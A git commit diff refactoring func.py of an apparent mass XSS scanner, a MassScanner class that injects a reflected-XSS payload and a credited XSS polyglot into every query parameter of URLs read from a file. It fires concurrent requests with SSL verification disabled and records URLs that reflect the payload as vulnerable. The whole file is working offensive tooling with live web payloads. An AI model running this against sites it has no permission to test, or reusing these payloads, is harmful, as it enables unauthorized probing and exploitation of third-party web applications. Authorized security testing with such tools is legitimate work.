a4bcb0a5f8dd74286e037c2d943524f095bda9f1
Sarper AVCI <50243344+sarperavci@users.noreply.github.com>
2024-07-29 22:27:01 +0300

    Performance Improvements and Refactoring
    Improved URL parsing and concurrent request handling functions. Some variable and function names have been modified to follow camelCase convention.

--- func.py
+++ func.py
@@ -1,94 +1,82 @@
 import time
 import aiohttp
 import asyncio
-import furl
 from colorama import Fore
-import urllib.parse
+from urllib.parse import urlencode, parse_qs, urlsplit, urlunsplit, urlparse, quote, urlunparse
 
 class MassScanner:
     def __init__(self, file, output , concurrency, timeout, redactDomains=False):
         self.file = file
         self.output = output
-        self.queue = []
         self.payload =  '"><img//////src=x oNlY=1 oNerror=alert(1)//'
-        self.encoded_payload = urllib.parse.quote(self.payload.replace(" ", "+") , safe="+" )
-        self.polygot_payload =  urllib.parse.quote(""""jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )////</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e""") # Thanks to @0xsobky - https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
+        self.encodedPayload = quote(self.payload.replace(" ", "+") , safe="+" )
+        self.polygotPayload =  quote(""""jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )////</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e""") # Thanks to @0xsobky - https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
         self.concurrency = concurrency
         self.timeout = timeout
         self.redactDomains = redactDomains
-        self.pending = []
-        self.total_found = 0
-        self.total_scanned = 0
+        self.injectables = []
+        self.totalFound = 0
+        self.totalScanned = 0
         self.t0 = time.time()
     
     def redactURL(self, url):
-        furl_obj = furl.furl(url)
-        furl_obj.host = "REDACTED"
-        return furl_obj.url 
+        parsedUrl = urlparse(url)
+        redactedUrl = parsedUrl._replace(netloc="REDACTED")
+        return urlunparse(redactedUrl)
  
-    def createURLs(self, url): # This function creates all possible URL combinations by injecting the payload to each query parameter. Returns a list of URLs.
-        url_combinations = []
+    def generatePayloadURLs(self,url):
+        urlCombinations = []
+        scheme, netloc, path, queryString, fragment = urlsplit(url)
+        queryParams = parse_qs(queryString, keep_blank_values=True)
+        for key in queryParams.keys():
+            modifiedParams = queryParams.copy()
+            modifiedParams[key] = [self.payload]  # Replace the parameter value with the payload
+            modifiedQueryString = urlencode(modifiedParams, doseq=True)
+            modifiedUrl = urlunsplit((scheme, netloc, path, modifiedQueryString, fragment))
+            urlCombinations.append(modifiedUrl)
 
-        furl_obj = furl.furl(url)
-        query_string = furl_obj.args
-
-        for key in query_string:
-            furl_obj_copy = furl_obj.copy()
-            furl_obj_copy.args[key] = self.payload
-            url_combinations.append(furl_obj_copy.url)
-        
-        return url_combinations
+        return urlCombinations
     
-    def save_vulnerable_url(self, url):
+    def saveInjectablesToFile(self):
         with open(self.output, "a") as f:
-            f.write(url + "\n")
+            for url in self.injectables:
+                f.write(url + "\n")
+        self.injectables = []
 
     async def fetch(self, session:aiohttp.ClientSession, url:str):
         try:
-            async with session.get(url,allow_redirects=True,timeout=self.timeout)  as resp:
+            async with session.get(url,timeout=self.timeout) as resp:
                 return (await resp.text() ,   url)
-        except:
-            return ("", url)
-        
-    def process_task(self,task):
-        self.total_scanned += 1
-        response_text , url  = task.result()
-        url = url.replace(self.encoded_payload, self.polygot_payload )
-        if self.payload in response_text:
-            self.save_vulnerable_url(url)
-            self.total_found +=1
+        except Exception as e:
+            return ("",   url)
+                
+    def processTask(self,task):
+        self.totalScanned += 1
+        responseText , url  = task.result()
+        url = url.replace(self.encodedPayload, self.polygotPayload )
+        if self.payload in responseText:
+            self.injectables.append(url)
+            self.totalFound +=1
             print(f"{Fore.RED} [+] Vulnerable parameter found: {Fore.WHITE} {(self.redactURL(url) if self.redactDomains else url)}")
 
     async def scan(self):
-        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(verify_ssl=False)) as session:
+        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(verify_ssl=False,limit=0)) as session:
             urlsFile = open(self.file, "r")
             line = urlsFile.readline()
+            while line:
+                pending = []
+                while len(pending) < self.concurrency and line:
+                    urlsWithPayload = self.generatePayloadURLs(line.strip())
+                    for url in urlsWithPayload:
+                        pending.append(asyncio.create_task(self.fetch(session,url)))
+                    line = urlsFile.readline()
 
-            while line or self.pending or self.queue: 
-                # create new tasks until the concurrency limit is reached
-                while len(self.pending) < self.concurrency: 
-                    if self.queue:
-                        self.pending.append(asyncio.create_task(self.fetch(session, self.queue.pop(0))) )
-                    else:
-                        if not line:
-                            break
-                        payload_urls = self.createURLs(line.strip())
-                        for payload_url in payload_urls:
-                            if len(self.pending) < self.concurrency:
-                                self.pending.append(asyncio.create_task(self.fetch(session, payload_url)))
-                            else:
-                                self.queue.append(payload_url)
-                        line = urlsFile.readline()
-                       
-
-                # wait for at least one task to be completed        
-                done, self.pending = await asyncio.wait(self.pending, return_when=asyncio.FIRST_COMPLETED)
-                self.pending = list(self.pending)
-
-                # process the completed tasks
+                done, _ = await asyncio.wait(pending)
                 for task in done:
-                    self.process_task(task)
+                    self.processTask(task)
 
+                self.saveInjectablesToFile()
+            
             urlsFile.close()
 
     def run(self):
@@ -100,7 +88,7 @@ class MassScanner:
         asyncio.run(self.scan())
         
         print(f"{Fore.YELLOW} [i] Scanning finished. All URLs are saved to {self.output}")
-        print(f"{Fore.YELLOW} [i] Total found: {self.total_found}")
-        print(f"{Fore.YELLOW} [i] Total scanned: {self.total_scanned}")
+        print(f"{Fore.YELLOW} [i] Total found: {self.totalFound}")
+        print(f"{Fore.YELLOW} [i] Total scanned: {self.totalScanned}")
         print(f"{Fore.YELLOW} [i] Time taken: {int(time.time() - self.t0)} seconds")
         
